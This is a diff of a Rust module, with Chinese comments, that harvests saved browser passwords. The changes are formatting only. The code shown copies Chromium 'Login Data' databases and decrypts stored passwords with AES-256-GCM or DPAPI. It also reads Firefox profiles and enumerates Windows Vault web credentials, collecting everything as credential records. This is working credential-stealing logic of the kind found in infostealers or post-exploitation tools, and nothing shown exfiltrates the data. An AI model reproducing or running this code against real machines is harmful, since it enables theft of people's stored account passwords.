@@ -7,7 +7,7 @@
 //! - Mozilla Firefox
 //! - Internet Explorer (legacy)
 
-use crate::cred::{Credential, CredType};
+use crate::cred::{CredType, Credential};
 // 已移除未使用的 HashMap import
 use std::path::PathBuf;
 
@@ -89,7 +89,8 @@ fn extract_chromium_passwords() -> Result<Vec<Credential>, String> {
                     continue;
                 }
 
-                let profile_name = profile_path.file_name()
+                let profile_name = profile_path
+                    .file_name()
                     .and_then(|n| n.to_str())
                     .unwrap_or("");
 
@@ -108,7 +109,9 @@ fn extract_chromium_passwords() -> Result<Vec<Credential>, String> {
                     Ok(browser_creds) => {
                         tracing::info!(
                             "[浏览器密码] {} / {}: 找到 {} 个凭据",
-                            browser_name, profile_name, browser_creds.len()
+                            browser_name,
+                            profile_name,
+                            browser_creds.len()
                         );
                         credentials.extend(browser_creds);
                     }
@@ -128,7 +131,8 @@ fn get_local_appdata() -> PathBuf {
     std::env::var("LOCALAPPDATA")
         .map(PathBuf::from)
         .unwrap_or_else(|_| {
-            let home = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".to_string());
+            let home =
+                std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".to_string());
             PathBuf::from(home).join("AppData").join("Local")
         })
 }
@@ -178,12 +182,11 @@ fn parse_chromium_login_db(
     let temp_dir = std::env::temp_dir();
     let temp_db = temp_dir.join(format!("login_data_{}.tmp", uuid::Uuid::new_v4()));
 
-    std::fs::copy(db_path, &temp_db)
-        .map_err(|e| format!("复制Login Data失败: {}", e))?;
+    std::fs::copy(db_path, &temp_db).map_err(|e| format!("复制Login Data失败: {}", e))?;
 
     // 使用rusqlite读取
-    let conn = rusqlite::Connection::open(&temp_db)
-        .map_err(|e| format!("打开SQLite数据库失败: {}", e))?;
+    let conn =
+        rusqlite::Connection::open(&temp_db).map_err(|e| format!("打开SQLite数据库失败: {}", e))?;
 
     let mut stmt = conn
         .prepare("SELECT origin_url, username_value, password_value FROM logins")
@@ -213,11 +216,14 @@ fn parse_chromium_login_db(
 
         if !password.is_empty() && password != "(加密)" && password != "(需要DPAPI)" {
             credentials.push(
-                Credential::new(CredType::BrowserPassword, &format!("{}浏览器", browser_name))
-                    .with_username(&username)
-                    .with_password(&password)
-                    .with_target(&url)
-                    .with_attribute("browser", browser_name)
+                Credential::new(
+                    CredType::BrowserPassword,
+                    &format!("{}浏览器", browser_name),
+                )
+                .with_username(&username)
+                .with_password(&password)
+                .with_target(&url)
+                .with_attribute("browser", browser_name),
             );
         }
     }
@@ -244,8 +250,7 @@ fn decrypt_chromium_password(encrypted: &[u8], key_hex: &str) -> Result<String, 
     let nonce = &encrypted[3..15];
     let ciphertext_with_tag = &encrypted[15..];
 
-    let key = hex::decode(key_hex)
-        .map_err(|e| format!("密钥解码失败: {}", e))?;
+    let key = hex::decode(key_hex).map_err(|e| format!("密钥解码失败: {}", e))?;
 
     // AES-256-GCM解密
     // use aes::Aes256;
@@ -254,8 +259,7 @@ fn decrypt_chromium_password(encrypted: &[u8], key_hex: &str) -> Result<String, 
         Aes256Gcm, Nonce,
     };
 
-    let cipher = Aes256Gcm::new_from_slice(&key)
-        .map_err(|_| "AES-GCM初始化失败".to_string())?;
+    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|_| "AES-GCM初始化失败".to_string())?;
 
     let nonce = Nonce::from_slice(nonce);
 
@@ -263,8 +267,7 @@ fn decrypt_chromium_password(encrypted: &[u8], key_hex: &str) -> Result<String, 
         .decrypt(nonce, ciphertext_with_tag)
         .map_err(|_| "AES-GCM解密失败".to_string())?;
 
-    String::from_utf8(plaintext)
-        .map_err(|e| format!("UTF-8解码失败: {}", e))
+    String::from_utf8(plaintext).map_err(|e| format!("UTF-8解码失败: {}", e))
 }
 
 /// 解密Chromium密码（使用DPAPI——旧版Chrome）
@@ -278,8 +281,7 @@ fn decrypt_chromium_password_dpapi(encrypted: &[u8]) -> Result<String, String> {
     };
 
     match dpapi_decrypt(dpapi_data) {
-        Ok(plaintext) => String::from_utf8(plaintext)
-            .map_err(|e| format!("UTF-8解码失败: {}", e)),
+        Ok(plaintext) => String::from_utf8(plaintext).map_err(|e| format!("UTF-8解码失败: {}", e)),
         Err(e) => Err(format!("DPAPI解密失败: {}", e)),
     }
 }
@@ -345,7 +347,10 @@ fn extract_firefox_passwords() -> Result<Vec<Credential>, String> {
                                         .with_password(&pass)
                                         .with_target(hostname)
                                         .with_attribute("browser", "Firefox")
-                                        .with_attribute("firefox_profile", &profile_dir.to_string_lossy())
+                                        .with_attribute(
+                                            "firefox_profile",
+                                            &profile_dir.to_string_lossy(),
+                                        ),
                                 );
                             }
                         }
@@ -364,8 +369,8 @@ fn parse_firefox_profiles(
     firefox_dir: &std::path::Path,
 ) -> Result<Vec<PathBuf>, String> {
     let mut profiles = Vec::new();
-    let content = std::fs::read_to_string(ini_path)
-        .map_err(|e| format!("读取profiles.ini失败: {}", e))?;
+    let content =
+        std::fs::read_to_string(ini_path).map_err(|e| format!("读取profiles.ini失败: {}", e))?;
 
     let mut current_section = String::new();
     let mut current_path: Option<String> = None;
@@ -387,7 +392,7 @@ fn parse_firefox_profiles(
                     }
                 }
             }
-            current_section = line[1..line.len()-1].to_string();
+            current_section = line[1..line.len() - 1].to_string();
             current_path = None;
             current_relative = true;
         } else if let Some(eq_pos) = line.find('=') {
@@ -448,7 +453,11 @@ fn extract_ie_passwords() -> Result<Vec<Credential>, String> {
             if line.contains("Web Credentials") || line.contains("Windows Credentials") {
                 // 使用vaultcmd /listcreds获取详细凭据
                 // 需要管理员权限才能读取密码
-                let cred_type = if line.contains("Web") { "Web凭据" } else { "Windows凭据" };
+                let cred_type = if line.contains("Web") {
+                    "Web凭据"
+                } else {
+                    "Windows凭据"
+                };
                 tracing::info!("[浏览器密码] 发现IE/Edge {}: {}", cred_type, line);
             }
         }
